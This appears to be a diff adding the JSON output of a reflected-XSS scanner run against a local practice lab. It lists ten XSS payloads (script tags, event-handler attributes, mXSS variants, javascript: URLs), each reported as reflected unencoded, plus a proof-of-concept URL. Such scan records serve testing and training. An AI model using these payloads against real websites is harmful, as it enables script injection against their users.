@@ -1,0 +1,113 @@
+{
+  "tool": "reflected-xss-scanner",
+  "version": "1.0",
+  "target": "http://127.0.0.1/vulnerabilities/xss_r/",
+  "timestamp": "2026-11-08 14:48:51",
+  "cookie": "PHPSESSID=pio9vir55opk5pi13vvr61m6k0; security=low",
+  "findings": [],
+  "waf": {
+    "baseline_status": 200,
+    "attack_status": 200,
+    "suspected": false,
+    "evidence": []
+  },
+  "notes": [],
+  "param": "name",
+  "method": "GET",
+  "reflected": true,
+  "context": {
+    "found": true,
+    "index": 2557,
+    "context": "html",
+    "quote": null,
+    "in_tag": false,
+    "in_script": false,
+    "snippet": "e=\"name\"> \t\t\t\t<input type=\"submit\" value=\"提交\"> \t\t\t</p>  \t\t</form> \t\t<pre>你好 zqSkzCVZrgqz</pre> \t</div>  \t<h2>更多信息</h2> \t<ul> \t\t<li><a href=\"https://www.owasp.org/i"
+  },
+  "char_survival": "<q>\"w'e/r(t)y",
+  "payload_trials": [
+    {
+      "payload": "<script>alert(1)</script>",
+      "desc": "经典 script 标签",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<script>alert`1`</script>",
+      "desc": "script + 模板字符串(无括号)",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<img src=x onerror=alert(1)>",
+      "desc": "img onerror 自动触发",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<svg onload=alert(1)>",
+      "desc": "svg onload",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<details open ontoggle=alert(1)>",
+      "desc": "details ontoggle",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<body onload=alert(1)>",
+      "desc": "body onload",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<iframe src=javascript:alert(1)>",
+      "desc": "iframe javascript:",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+      "desc": "mXSS 变形",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<video><source onerror=alert(1)>",
+      "desc": "video/source onerror",
+      "needs_interaction": false,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    },
+    {
+      "payload": "<a href=javascript:alert(1)>click</a>",
+      "desc": "a href javascript:(需点击)",
+      "needs_interaction": true,
+      "result": "原样反射(未编码) => 极可能可执行",
+      "ok": true
+    }
+  ],
+  "browser": {
+    "engine": "",
+    "fired": false
+  },
+  "vulnerable": true,
+  "poc": {
+    "payload": "<script>alert(1)</script>",
+    "desc": "经典 script 标签",
+    "needs_interaction": false,
+    "result": "原样反射(未编码) => 极可能可执行",
+    "ok": true
+  },
+  "poc_url": "http://127.0.0.1/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+}
